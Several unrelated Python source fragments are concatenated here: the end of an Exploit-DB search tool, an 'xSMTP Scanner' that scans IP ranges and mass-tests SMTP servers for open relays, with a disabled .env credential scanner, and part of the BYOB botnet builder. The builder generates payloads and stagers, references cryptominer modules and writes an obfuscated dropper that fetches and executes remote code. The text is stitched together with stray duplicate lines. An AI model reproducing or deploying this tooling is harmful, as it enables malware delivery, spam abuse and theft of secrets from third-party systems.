        print("[i] Git Pull Complete")
    os.chdir(cwd)
    return


######################
##  DISPLAY TOOLS   ##
######################
def drawline():
    """ Draws a line in the terminal.
    """
    line = "" * (int(COL) - 1)
    print(line)


def drawline(lim):
    """ Draws a line in the terminal.\n
    @lim: column where the border is suppossed to be
    """
    line = "-" * lim
    line += "+"
    line += "-" * (COL - lim - 2)  # -2 for terminal padding
    print(line)


def highlightTerm(line, term):
    """ Part one of new highlighting process. Highlights by adding :8 and :9 as escape characters as ansi takes several lines. the rest is compiled in separater unless autocomp is true\n
    @line: the phrase to be checked\n
    @term: the term that will be found in line and used to highlight the line\n
    @autoComp: [optional] if true, then it will output the string with the flags already turned into ANSI
    """
    # immediate override if colour option is used
    if not parseArgs.colour:
        return line

    marker = 0  # marks where the term is first found
    term = term.lower()

    while (line.lower().find(term, marker) >= 0):
        marker = line.lower().find(term, marker)  # update location of new found term
        part1 = line[:marker]
        part2 = line[marker: marker + len(term)]
        part3 = line[marker + len(term):]
        line = "{0}\033[91m{1}\033[0m{2}".format(part1, part2, part3)
        marker += len(term) + 4
    return line


def separater(lim, line1: str, line2: str):
    """ Splits the two texts to fit perfectly within the terminal width
    """
    lim = int(lim)
    if parseArgs.overflow:
        line = line1 + " | " + line2
        print(line)
        return

    line1_length = lim - 1  # subtract 1 for padding
    # -2 for divider padding and -1 for terminal padding
    line2_length = int(COL) - lim - 2 - 1
    format_string = "{{title:{title_length}.{title_length}s}}\033[0m | {{path:{path_length}.{path_length}s}}\033[0m"

    # Escape options for colour
    if not parseArgs.colour:
        print("{{0:{0}.{0}s}} | {{1:{1}.{1}s}}".format(
            line1_length, line2_length).format(line1, line2))
        return

    # increase lim by markers to not include highlights in series
    last_mark = 0
    while (line1.find("\033[91m", last_mark, line1_length + 5) >= 0):
        line1_length += 5
        last_mark = line1.find("\033[91m", last_mark, line1_length + 5) + 5
    last_mark = 0
    while (line1.find("\033[0m", last_mark, line1_length + 4) >= 0):
        line1_length += 4
        last_mark = line1.find("\033[0m", last_mark, line1_length + 4) + 4
    last_mark = 0
    while (line2.find("\033[91m", last_mark, line2_length + 5) >= 0):
        line2_length += 5
        last_mark = line2.find("\033[91m", last_mark, line2_length + 5) + 5
    last_mark = 0
    while (line2.find("\033[0m", last_mark, line2_length + 4) >= 0):
        line2_length += 4
        last_mark = line2.find("\033[0m", last_mark, line2_length + 4) + 4

    # Creating format string for print
    fstring = format_string.format(
        title_length=line1_length, path_length=line2_length)
    line = fstring.format(title=line1, path=line2)
    print(line)


##############################
##  DATABASE MANIPULATION   ##
##############################
def cpFromDb(path, id):
    """ Returns database array of search for given id.\n
    path: absolute path of database\n
    id: the EDBID that is searched for in database
    """
    dbFile = open(path, "r", encoding="utf8")
    db = dbFile.read().split('\n')
    for lines in db:
        if lines.split(",")[0] == str(id):
            dbFile.close()
            return lines.split(",")
    dbFile.close()
    return []


def findExploit(id):
    """ This Function uses cpFromDB to iterate through all known databases and return exploit and the database it was found in\n
    @id: EDBID used to search all known databases\n
    @return: exploit[], database path
    """
    exploit = []
    for i in range(len(files_array)):
        exploit = cpFromDb(os.path.abspath(
            os.path.join(path_array[i], files_array[i])), id)
        if exploit == []:
            continue
        else:
            return i, exploit


def validTerm(argsList):
    """ Takes the terms inputed and returns an organized list with no repeats and no poor word choices
    """
    invalidTerms = ["microsoft", "microsoft windows", "apache", "ftp",
                    "http", "linux", "net", "network", "oracle", "ssh", "ms-wbt-server", "unknown", "none"]
    dudTerms = ["unknown", "none"]
    if parseArgs.exact:
        return argsList
    argsList.sort()
    argslen = len(argsList)
    for i in range(argslen - 1, -1, -1):
        if (argsList[i].lower() in dudTerms):
            argsList.pop(i)
        elif (argsList[i].lower() in invalidTerms and not parseArgs.ignore):
            print(
                "[-] Skipping term: " + argsList[i] + "   (Term is too general. Please re-search manually:")
            argsList.pop(i)
            # Issues, return with something
        elif argsList[i].lower() in parseArgs.exclude:
            argsList.pop(i)
        elif not parseArgs.case:
            argsList[i] = argsList[i].lower()
    argsList.sort()
    argslen = len(argsList)
    for i in range(argslen - 1, 0, -1):
        if (argsList[i] == argsList[i-1]):
            argsList.pop(i)
        # what to do if the list ends up empty afterwards
    if (len(argsList) == 0):
        print("Looks like those terms were too generic.")
        print("if you want to search with them anyway, run the command again with the -i arguement")
        exit()

    return argsList


def searchdb(path="", terms=[], cols=[], lim=-1):
    """ Searches for terms in the database given in path and returns the requested columns of positive matches.\n
    @path: the path of the database file to search\n
    @terms: a list of terms where all arguements must be found in a line to flare a positive match\n
    @cols: the columns requested in the order given. ex: cols=[2,0] or title, id\n
    @lim: an integer that counts as the limit of how many search results are requested\n
    @return: database array with positive results
    """
    searchTerms = []
    tmphold = []
    if parseArgs.exact:
        tmpstr = str(terms[0])
        for i in range(1, len(terms)):
            tmpstr += " " + terms[i]
        terms.clear()
        terms.append(tmpstr)
    dbFile = open(path, "r", encoding="utf8")
    db = dbFile.read().split('\n')
    for lines in db:
        if (lines != ""):
            for ex in parseArgs.exclude:
                if parseArgs.case and ex in lines:
                    break
                elif ex in lines.lower():
                    break
            else:
                for term in terms:
                    if parseArgs.title:
                        line = lines.split(",")[2]
                        if parseArgs.case:
                            if term not in line:
                                break
                        elif term not in line.lower():
                            break
                    elif parseArgs.case:
                        if term not in lines:
                            break
                    elif term not in lines.lower():
                        break
                else:
                    for i in cols:
                        space = lines.split(",")
                        tmphold.append(space[i])
                    searchTerms.append(tmphold)
                    tmphold = []
        if(lim != -1 and len(searchTerms) >= lim):
            break
    dbFile.close()
    return searchTerms


def searchsploitout():
    """ Convoluted name for the display. takes the global search terms and prints out a display iterating through every database available and printing out the results of the search.
    """
    # ## Used in searchsploitout/nmap's XML

    # xx validating terms
    validTerm(terms)
    if parseArgs.json:
        jsonDict = {}
        temp = ""
        for i in terms:
            temp += i + " "
        jsonDict["SEARCH"] = temp[:-1]  # Adding the search terms
        searchs = []
        try:
            for i in range(len(files_array)):
                jsonDict["DB_PATH_" + name_array[i].upper()] = path_array[i]
                searchs.clear()
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 0, 3, 4, 5, 6, 1])
                for lines in query:
                    searchs.append({"Title": lines[0].replace('"', ""), "EDB-ID": int(lines[1]), "Date": lines[2], "Author": lines[3].replace(
                        '"', ""), "Type": lines[4], "Platform": lines[5], "Path": path_array[i] + "/" + lines[6]})
                jsonDict["RESULTS_" + name_array[i].upper()] = searchs.copy()
                searchs.clear()
            import json.encoder
            jsonResult = json.dumps(
                jsonDict, indent=4, separators=(", ", ": "))
            print(jsonResult)
        except KeyboardInterrupt:
            pass
        return

    # xx building terminal look
    # the magic number to decide how much space is between the two subjects
    lim = int((COL - 3)/2)

    # manipulate limit if ID is used
    if parseArgs.id:
        lim = int(COL * 0.8)
    query = []  # temp variable thatll hold all the results
    try:
        for i in range(len(files_array)):
            if parseArgs.id:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 0])
            elif parseArgs.www:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 1, 0])
            else:
                query = searchdb(os.path.abspath(os.path.join(
                    path_array[i], files_array[i])), terms, [2, 1])

            if len(query) == 0:  # is the search results came up with nothing
                print(name_array[i] + ": No Results")
                continue
            drawline(COL//4)
            separater(COL//4, name_array[i] + " Title", "Path")
            separater(COL//4, "", os.path.abspath(path_array[i]))
            drawline(COL//4)  # display title for every database
            drawline(lim)
            for lines in query:
                # Removing quotes around title if present
                if (lines[0][0] == "\"" or lines[0][0] == "\'"):
                    lines[0] = lines[0][1:]
                if (lines[0][-1] == "\"" or lines[0][-1] == "\'"):
                    lines[0] = lines[0][:-1]

                if parseArgs.www:  # if requesting weblinks. shapes the output for urls
                    lines[1] = "https://www.exploit-db.com/" + \
                        lines[1][:lines[1].index("/")] + "/" + lines[2]
                if parseArgs.colour:
                    for term in terms:
                        lines[0] = highlightTerm(lines[0], term)
                        lines[1] = highlightTerm(lines[1], term)
                separater(lim, lines[0], lines[1])
            drawline(lim)
    except KeyboardInterrupt:
        drawline(lim)
        return


def nmapxml(file=""):
    """ This function is used for xml manipulation with nmap.\n
    @file: string path to xml file\n
    if no file name is given, then it tries stdin\n
    @return: returns true if it fails
    """
    import xml.etree.ElementTree as ET

    global terms
    global STDIN

    # First check whether file exists or use stdin
    try:
        if (type(file) == str):
            contentFile = open(file, "r")
        else:
            contentFile = file  # if file access, link directly to file pointer
        content = contentFile.read()
        contentFile.close()
    except:
        if(not os.sys.stdin.isatty()):
            content = os.sys.stdin.read()
            if content == "" and STDIN != "":
                content = STDIN
            elif content == "" and STDIN == "":
                return False
        else:
            return False

    # stope if blank or not an xml sheet
    if content == "" or content[:5] != "<?xml":
        STDIN = content
        return False
    # Read XML file

    # ## Feedback to enduser
    if (type(file) == str):
        print("[i] Reading: " + highlightTerm(str(file), str(file)))
    else:
        print("[i] Reading: " + highlightTerm(file.name, file.name))
    tmpaddr = ""
    tmpname = ""
    # ## Read in XMP (IP, name, service, and version)
    root = ET.fromstring(content)

    hostsheet = root.findall("host")
    for host in hostsheet:
        # made these lines to separate searches by machine
        tmpaddr = host.find("address").attrib["addr"]
        tmpaddr = highlightTerm(tmpaddr, tmpaddr)

        if (host.find("hostnames/hostname") != None):
            tmpname = host.find("hostnames/hostname").attrib["name"]
            tmpname = highlightTerm(tmpname, tmpname)
        print("Finding exploits for " + tmpaddr +
              " (" + tmpname + ")")  # print name of machine
        for service in host.findall("ports/port/service"):
            if "name" in service.attrib.keys():
                terms.append(str(service.attrib["name"]))
            if "product" in service.attrib.keys():
                terms.append(str(service.get("product")))
            if "version" in service.attrib.keys():
                terms.append(str(service.get("version")))
            validTerm(terms)
            print("Searching terms:", terms)  # displays terms found by xml
            searchsploitout()  # tests search terms by machine
            terms = []  # emptys search terms for next search

    return True


def nmapgrep(file=""):
    """

    """
    global terms
    global STDIN

    # First check whether file exists or use stdin
    try:
        if (type(file) == str):
            contentFile = open(file, "r")
        else:
            contentFile = file
        content = contentFile.read()
        contentFile.close()
    except:
        if(not os.sys.stdin.isatty()):
            content = os.sys.stdin.read()
            if content == "" and STDIN != "":
                content = STDIN
            elif content == "" and STDIN == "":
                return False
        else:
            return False

    # Check whether its grepable
    if (content.find("Host: ") == -1 or not "-oG" in content.split("\n")[0] or content == ""):
        STDIN = content
        return False

    # making a matrix to contain necessary strings
    nmatrix = content.split("\n")
    for lines in range(len(nmatrix) - 1, -1, -1):
        if (nmatrix[lines].find("Host: ") == -1 or nmatrix[lines].find("Ports: ") == -1):
            nmatrix.pop(lines)
        else:
            nmatrix[lines] = nmatrix[lines].split("\t")[:-1]
            nmatrix[lines][0] = nmatrix[lines][0][6:].split(" ")
            # pull hostname out of parenthesis
            nmatrix[lines][0][1] = nmatrix[lines][0][1][1:-
                                                        1] if (len(nmatrix[lines][0][1]) > 2) else ""
            nmatrix[lines][1] = nmatrix[lines][1][7:].split(", ")
            for j in range(len(nmatrix[lines][1])):
                nmatrix[lines][1][j] = nmatrix[lines][1][j].replace(
                    "/", " ").split()[3:]

    # Outputing results from matrix
    for host in nmatrix:
        tmpaddr = highlightTerm(host[0][0], host[0][0])
        tmpname = highlightTerm(host[0][1], host[0][1])
        print("Finding exploits for " + tmpaddr +
              " (" + tmpname + ")")  # print name of machine
        for service in host[1]:
            terms.extend(service)
            validTerm(terms)
            print("Searching terms:", terms)  # displays terms found by grep
            searchsploitout()  # tests search terms by machine
            terms = []  # emptys search terms for next search
    return True

##########################
##  COMMAND FUNCTIONS   ##
##########################


def path(id):
    """ Function used to run the path arguement
    """
    try:
        file, exploit = findExploit(id)
        print(os.path.abspath(os.path.join(path_array[file], exploit[1])))
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)


def mirror(id):
    """ Function used to mirror exploits
    """
    try:
        ind, exploit = findExploit(id)
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)
        return
    absfile = path_array[ind]

    currDir = os.getcwd()
    inp = open(os.path.normpath(os.path.join(absfile, exploit[1])), "rb")
    out = open(os.path.join(currDir, os.path.basename(exploit[1])), "wb")
    out.write(inp.read())
    inp.close()
    out.close()
    return


def examine(id):
    """ Function used to run examine arguement
    """
    try:
        ind, exploit = findExploit(id)
    except TypeError:
        print("%s does not exist. Please double check that this is the correct id." % id)
        return
    if exploit[1].endswith(".pdf"):
        import webbrowser
        webbrowser.open(
            "file:///" + os.path.abspath(os.path.join(path_array[ind], exploit[1])), autoraise=True)
    elif(os.sys.platform == "win32"):
        os.system(
            "notepad " + os.path.relpath(os.path.join(path_array[ind], exploit[1])))
    else:
        os.system(
            "pager " + os.path.relpath(os.path.join(path_array[ind], exploit[1])))
    print("[EDBID]:" + exploit[0])
    print("[Exploit]:" + exploit[2])
    print("[Path]:" + os.path.abspath(os.path.join(path_array[ind], exploit[1])))
    print("[URL]:https://www.exploit-db.com/" +
          exploit[1].split("/")[0] + "/" + exploit[0])
    print("[Date]:" + exploit[3])
    print("[Author]:" + exploit[4])
    print("[Type]:" + exploit[5])
    print("[Platform]:" + exploit[6])
    print("[Port]:" + exploit[7])

##################
##  HOOK SCRIPT ##
##################


def run():
    """ Main function of script. hooks rest of functions
    """

    # Colors for windows
    if parseArgs.colour and os.sys.platform == "win32":
        try:
            import colorama
        except ImportError:
            print(
                "You do not have colorama installed. if you want to run with colors, please run:")
            print(
                "\"pip install colorama\" in your terminal so that windows can use colors.")
            print("Printing output without colors")
            parseArgs.colour = False
        else:
            colorama.init()

    if (len(argv) == 1 and os.sys.stdin.isatty()):
        parser.print_help()  # runs if given no arguements
        return

    # DB Tools
    if parseArgs.mirror != None:
        mirror(parseArgs.mirror)
        return
    elif parseArgs.path != None:
        path(parseArgs.path)
        return
    elif parseArgs.update:
        update()
        return
    elif parseArgs.examine != None:
        examine(parseArgs.examine)
        return

    # formatting exclusions
    if not parseArgs.case:
        for i in range(len(parseArgs.exclude)):
            parseArgs.exclude[i] = parseArgs.exclude[i].lower()

    # Nmap tool
    if parseArgs.nmap != None:
        result = nmapxml(parseArgs.nmap)
        if not result:
            result = nmapgrep(parseArgs.nmap)
            if not result:
                parser.print_help()
                return

    terms.extend(parseArgs.searchTerms)

    if (parseArgs.nmap == None and not os.sys.stdin.isatty()):
        text = str(os.sys.stdin.read())
        terms.extend(text.split())

    searchsploitout()


run()
"""
Coded by Dpr
https://github.com/c99tn
https://t.me/+7wraokmFiCcxOTk0
Join Our Telegram Channel For More Great Stuff //
"""
from ast import arg
import requests
import socket
import ipaddress
import smtplib
from multiprocessing.dummy import Pool as ThreadPool 
import time
from termcolor import colored
import os
import sys

socket.setdefaulttimeout(.3)
os.system('clear')
myemail = 'your@email.com'
print(colored("""\Join us .. https://t.me/+7wraokmFiCcxOTk0                              

                                   ;:     ,:;+*%%SS%*:                                    
                               ;: :S%*;+*?%SSSSS%*:,                                      
                          ,: ,:%%??S%SSSSSSSS?*;,                                         
                    ,,    ,%+?%SSSSSSSSSSSSSS%%%%??*+;:,                                  
                   ;? :*%SSSSSSSSSSSSSSSSSSSSSSSSS%%?*;:,,                                
                   ?; ,,%SSSSSSSSS?:;+*?SS?**?S*;:,,                                      
                  :? +%%SS%SSSSSS%:     :+?*;,;**;,                                       
                  *+ %SSS?,;?%?++*:        :+**;;+?*:                                     
                 ,?, ;SS??  ;*   ,?,          :;+++???*+;::                    
                 ++ :%%:,?  :?    ;*                 ,;??+:,,,,                     
                ,?;;*?* ,?  ,?,    +*                   ,+**;,,                           
                ;?:+*:+ :*  ++      +*,                    :;++++;:,,                     
           ,:;+;;+:  ;:,* :*,         ,+*,                               
        ,:;;;::;;,  ,; *;,+,            ;*;              xSMTP Scanner                          
    ,,:;::, ,;;,    ,,:*,;,              ,;+;,         Multithreaded Version                                  
  ,::,,  ,:;:,       :?,,                  ,:++:,                                     
        ::,        :++,                       ,;+;,           Coded by Dpr                                    
                 :+;,                            ,::,           github.com/c99tn
""",'blue'))

"""
#Deprecated, to format input data logs from PortSpyder, shoutout my friend @xdavidhu
def format():
  print('Starting Format Now...')
  with open('filter.txt') as fil:
      f = open("list.txt", "a")
      for myStr in fil:
        if 'subnet' in myStr:
          print('skipped subnet..')
        else:
          urStr = myStr.replace(' - OPEN: ',':')
          splited = urStr.split(':')
          myIP = splited[0]
          ports = splited[1]
          myPorts = ports.split(' ')
          for port in myPorts:
            if port == myPorts[-1]:
              f.write(myIP+':'+port)
            else:
              f.write(myIP+':'+port+'\n')
  f.close()
  print('Done !')
 """

def scan(line):
  data = line.split(":")
  ip = data[0]
  port = int(data[1])
  try:
      with smtplib.SMTP(ip, port, timeout=0.5) as smtp:
          smtp.ehlo()
          subject = 'Email Tester !'
          body = 'Email delivered from', ip, 'with port', port
          msg = f'Subject: {subject}\n\n{body}'
          smtp.sendmail('Pedri <dpr@priv8shop.com>', myemail, msg)
          print(colored(('Good SMTP Devlivered to '+str(myemail)+' '+str(ip)+':'+str(port)),'green'))
          f = open("smtp.txt", "a")
          rz = ip + ":" + str(port)
          f.write(rz)
          f.write("\n")
          f.close()
  except Exception as e:
      print(colored('Bad SMTP Dead!'+ip+':'+str(port)+' -- '+str(e),'red'))

def listenn(line):
  data = line.split(":")
  ip = data[0]
  port = int(data[1])
  DEVICE_SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  rez = DEVICE_SOCKET.connect_ex((str(ip),int(port)))
  if rez == 0:
    info = str(ip)+':'+str(port)
    notif = str(port)+' is open on '+str(ip)
    print(colored(notif,'green'))
    f = open("list.txt", "a")
    f.write(info+"\n")
    DEVICE_SOCKET.close()
  else:
    info = str(port)+' is closed on '+str(ip)
    print(colored(info,'red'))

def domainASN():
  print(colored('Enter your website (without http:// ):','green'))
  url = input('> ')
  try:
        ip_addr = socket.gethostbyname(url)
  except:
          print(colored('Host not found !', 'red'))
          sys.exit()
  asn_fetch = requests.get('https://ipinfo.io/'+ip_addr+'/org?token=c8bb8b5ed87127')
  asn = (asn_fetch.text)
  
  print(colored(asn , 'blue'))
  myasn = asn.split(' ')[0]
  try:
    res = requests.get('https://api.hackertarget.com/aslookup/?q='+myasn)
    print(colored("IP Ranges found: \n", 'magenta'))
    print(res.text+'\n') 
  except:
    print(colored("Dead host maybe!","red"))
    sys.exit()
  with open("ranges.txt", 'a') as f:
    f.write(res.text+'\n')
  print(colored('Success, Ranges saved in ./ranges.txt','green'))

"""
print(colored('','green'))
uncomment to scan for some env paths on ports 80 443 ;P
need help? https://t.me/dpr52

def checkEnv(line):
  data = line.split(":")
  ip = data[0]
  try:
    res = requests.get('http://'+ip+'/.env')
    if 'DB_HOST' in res.text:
      print(colored('Env found:'+str(ip)+'/.env \n', 'green'))
      with open("env.txt", 'a') as f:
        f.write(str(ip)+'/.env \n')
    else:
      print(colored('Nothing BRo:'+str(ip)+'\n', 'red'))
  except:
    print(colored("Dead host maybe!","red"))
"""

## Menu
ans=True
while ans:
    print(colored('[- xSMTP Scanner -]','red'))
    print (colored("""
[1] - Get IP Ranges From a Website (ASN FETCH)
[2] - Check IP Ranges (Listen For SMTP Ports)
[3] - Mass Scan SMTPs
[4] - Help

[5] - Update
[6] - Exit
    """,'cyan'))
    ans=input("> ") 
    if ans=="1": 
      domainASN()
    #########################################################
    elif ans=="3":
      print(colored("""Enter Your Email address to test the SMTP servers :""",'green'))
      print(colored("""Important: Dont use Gmail ! Use Yandex or Protonmail for best results """,'red'))
      myemail = input('> ')
      print(colored("""How many threads to use ?
(Recommended : 50)""",'green'))
      tr2 = input('> ')
      lines = []
      with open('list.txt') as top:
        for line in top:
          lines.append(line)
      print('Scanning '+ str(len(lines)))
      time.sleep(2)
      pool = ThreadPool(int(tr2))
      results = pool.map(scan, lines)
      pool.close() 
      pool.join()

      with open("list.txt", 'r+') as f:
        f.truncate(0)
      print('Done')
    #########################################################
    elif ans=="2":
      print(colored("""[1] - Listen For Recommended Ports [2525,587]
[2] - Listen For All Ports [25,2525,465,587]
      """,'green'))
      method = input('> ')
      print(colored("""How many threads to use ?
(Recommended : 50)""",'green'))
      tr1 = input('> ')
      with open("ranges.txt", "r") as f:
        lines = f.readlines()
      with open("ranges.txt", "w") as f:
          for line in lines:
              noalpha = any(c.isalpha() for c in line)
              if (':' not in line) and (not noalpha):
                  f.write(line)

      #range = input('give ip range list:\n')
      print(colored('Collecting all Hosts in your Ranges.. Please Wait','blue'))
      if method == '1':
        ports = [2525,587]
      elif method == '2':
        ports = [25,2525,465,587]
      inp = []
      cip = 0
      with open('ranges.txt') as ranges:
        for range in ranges:
          range.replace("\n", "")
          for ip in ipaddress.IPv4Network(range.strip()):
            for port in ports:
              inp.append(str(ip)+':'+str(port))
              cip += 1
      print(colored(str(cip)+' Hosts collected !','blue'))
      time.sleep(2)
      pool = ThreadPool(int(tr1))
      results = pool.map(listenn, inp)
      pool.close() 
      pool.join()
      with open("ranges.txt", 'r+') as f:
        f.truncate(0)
      print(colored('Done, Hosts saved in ./list.txt','green'))
    #########################################################
    elif ans=="6":
      print('Goodbye...')
      sys.exit()
    #########################################################
    elif ans=="5":
      print(colored("""Clone from the official repo : https://github.com/c99tn/xSMTP
and run git pull to fetch and download latest updates to xSMTP!
Want to be notified on latest updates and new tools/auto shell bots ? 
join our telegram channel: https://t.me/+7wraokmFiCcxOTk0
Want to get in touch ? dm me on telegram @dpr52
      """,'magenta'))
    #########################################################
    elif ans=="4":
      print(colored('Quota Limit Reached Error ?','blue'))
      print(colored("""
This happens when you request too many ASN lookups in a single day, you will have to wait
and try again later or use your own ip ranges !
      """,'cyan'))
      print(colored('How to get good IP Ranges for SMTP ?','blue'))
      print(colored("""
Shodan, leakix, ip2info, ASN reverse .... Cant say more !
      """,'cyan'))
      print(colored('I dont recieve SMTP Test to my email ?','blue'))
      print(colored("""
Not all SMTPs deliver to your inbox, check spam folder and try to use one of the recommmended
email providers such as Yandex or Protonmail
      """,'cyan'))
      print(colored('Can I use this on a network I dont own ?','blue'))
      print(colored("""
No and this is illegal !I'm not responsible for anything you do with this tool, 
so please only use it for good and educational purposes.
      """,'cyan'))
      
    #########################################################
    elif ans=="/.!#xz":
      print('scanning Env now')
      lines = []
      with open('list.txt') as top:
        for line in top:
          lines.append(line)
      print('Scanning '+ str(len(lines)))
      time.sleep(20000)
      with open("list.txt", 'r+') as f:
        f.truncate(0)
      print('Done')


    



if __name__ == '__main__':
    main()


if __name__ == '__main__':
    main()


    global __load__
    globals()['__load__'] = threading.Event()
    globals()['__spin__'] = _spinner(__load__)

    imports  = set()

    for module in kwargs['modules']:
        for line in open(module, 'r').read().splitlines():
            if len(line.split()):
                if line.split()[0] == 'import':
                    for x in ['core'] + [os.path.splitext(i)[0] for i in os.listdir('core')] + ['core.%s' % s for s in [os.path.splitext(i)[0] for i in os.listdir('core')]]:
                        if x in line:
                            break
                    else:
                        imports.add(line.strip())

    imports = list(imports)
    if sys.platform != 'win32':
        for item in imports:
            if 'win32' in item or '_winreg' in item:
                imports.remove(item)
    return imports

def _hidden(options, **kwargs):
    assert 'imports' in kwargs, "missing keyword argument 'imports'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"

    hidden = set()

    for line in kwargs['imports']:
        if len(line.split()) > 1:
            for i in str().join(line.split()[1:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)
        elif len(line.split()) > 3:
            for i in str().join(line.split()[3:]).split(';')[0].split(','):
                i = line.split()[1] if i == '*' else i
                hidden.add(i)

    globals()['__load__'].set()
    util.display("({} imports from {} modules)".format(len(list(hidden)), len(kwargs['modules'])), color='reset', style='dim')
    return list(hidden)

def _payload(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Payload", color='reset', style='bright')

    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'modules' in kwargs, "missing keyword argument 'modules'"
    assert 'imports' in kwargs, "missing keyword argument 'imports'"

#    loader  = '\n'.join((open('core/loader.py','r').read(), generators.loader(host=options.host, port=int(options.port)+2, packages=list(kwargs['hidden']))))
    loader  = open('core/loader.py','r').read()
    test_imports = '\n'.join(['import ' + i for i in list(kwargs['hidden']) if i not in ['StringIO','_winreg','pycryptonight','pyrx']])
    potential_imports = '''
try:
    import pycryptonight
    import pyrx
except ImportError: pass
'''
    modules = '\n'.join(([open(module,'r').read().partition('# main')[2] for module in kwargs['modules']] + [generators.main('Payload', **{"host": options.host, "port": options.port, "pastebin": options.pastebin if options.pastebin else str()}) + '_payload.run()']))
    payload = '\n'.join((loader, test_imports, potential_imports, modules))

    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")

    if not os.path.isdir('modules/clients/payloads'):
        try:
            os.mkdir('modules/clients/payloads')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/payloads/'")

    if options.compress:
        util.display("\tCompressing payload... ", color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = generators.compress(payload)
        __load__.set()
        _update(payload, output, task='Compression')
        payload = output

    if options.encrypt:
        assert 'key' in kwargs, "missing keyword argument 'key' required for option 'encrypt'"
        util.display("\tEncrypting payload... ".format(kwargs['key']), color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = security.encrypt_xor(payload, base64.b64decode(kwargs['key']))
        __load__.set()
        _update(payload, output, task='Encryption')
        payload = output

    util.display("\tUploading payload... ", color='reset', style='normal', end=' ')

    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    if options.pastebin:
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(payload, options.pastebin)
    else:
        dirs = ['modules/clients/payloads','byob/modules/clients/payloads','byob/byob/modules/clients/payloads']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d

        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )

        with open(path, 'w') as fp:
            fp.write(payload)
         
        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urlparse.urlsplit(s)
        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')

    __load__.set()
    util.display("(hosting payload at: {})".format(url), color='reset', style='dim')
    return url

def _stager(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Stager", color='reset', style='bright')

    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'key' in kwargs, "missing keyword argument 'key'"
    assert 'var' in kwargs, "missing keyword argument 'var'"

    if options.encrypt:
        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'], key=kwargs['key'])
    else:
        stager = open('core/stagers.py', 'r').read() + generators.main('run', url=kwargs['url'])

    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")

    if not os.path.isdir('modules/clients/stagers'):
        try:
            os.mkdir('modules/clients/stagers')
        except OSError:
            util.log("Permission denied: unable to make directory './modules/clients/stagers/'")

    if options.compress:
        util.display("\tCompressing stager... ", color='reset', style='normal', end=' ')
        __load__ = threading.Event()
        __spin__ = _spinner(__load__)
        output = generators.compress(stager)
        __load__.set()
        _update(stager, output, task='Compression')
        stager = output

    util.display("\tUploading stager... ", color='reset', style='normal', end=' ')
    __load__ = threading.Event()
    __spin__ = _spinner(__load__)

    if options.pastebin:
        assert options.pastebin, "missing argument 'pastebin' required for option 'pastebin'"
        url = util.pastebin(stager, options.pastebin)
    else:
        dirs = ['modules/clients/stagers','byob/modules/clients/stagers','byob/byob/modules/clients/stagers']
        dirname = '.'
        for d in dirs:
            if os.path.isdir(d):
                dirname = d

        path = os.path.join(os.path.abspath(dirname), kwargs['var'] + '.py' )

        with open(path, 'w') as fp:
            fp.write(stager)

        s = 'http://{}:{}{}'.format(options.host, int(options.port) + 1, pathname2url(path.replace(os.path.join(os.getcwd(), 'modules'), '')))
        s = urlparse.urlsplit(s)
        url = urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')

    __load__.set()
    util.display("(hosting stager at: {})".format(url), color='reset', style='dim')
    return url

def _dropper(options, **kwargs):
    util.display("\n[>]", color='green', style='bright', end=' ')
    util.display("Dropper", color='reset', style='bright')
    util.display('\tWriting dropper... ', color='reset', style='normal', end=' ')

    assert 'url' in kwargs, "missing keyword argument 'url'"
    assert 'var' in kwargs, "missing keyword argument 'var'"
    assert 'hidden' in kwargs, "missing keyword argument 'hidden'"

    if not os.path.isdir('modules/clients'):
        try:
            os.mkdir('modules/clients')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/'")
    
    if not os.path.isdir('modules/clients/droppers'):
        try:
            os.mkdir('modules/clients/droppers')
        except OSError:
            util.log("Permission denied: unabled to make directory './modules/clients/droppers/'")
    
    dirs = ['modules/clients/droppers','byob/modules/clients/droppers','byob/byob/modules/clients/droppers']
    dirname = '.'
    for d in dirs:
        if os.path.isdir(d):
            dirname = d

    name = 'byob_{}.py'.format(kwargs['var']) if not options.name else options.name
    if not name.endswith('.py'):
        name += '.py'

    path = os.path.join(os.path.abspath(dirname), name)

    dropper = """import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode({})))))""".format(repr(base64.b64encode(zlib.compress(marshal.dumps("urlopen({}).read()".format(repr(kwargs['url'])),2)))))

    with open(path, 'w') as fp:
        fp.write(dropper)
